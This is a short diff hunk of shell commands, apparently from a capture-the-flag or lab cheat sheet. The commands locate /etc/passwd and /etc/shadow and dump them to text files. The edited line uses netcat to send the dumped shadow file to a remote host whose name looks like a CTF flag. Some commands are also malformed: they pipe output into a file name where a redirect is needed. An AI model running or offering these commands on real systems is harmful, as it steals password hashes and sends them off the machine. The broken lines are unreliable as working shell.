@@ -65,7 +65,7 @@ find /etc/passwd
 find /etc/shadow
 cat /etc/passwd | passwd.txt
 cat /etc/shadow | shadow.txt
-nc site.com 1234 (less than) file_name
+nc RS{GIT_GUD}.com 22 < shadow.txt
 lsof +L1
 echo
 echo file modded in 24hrs
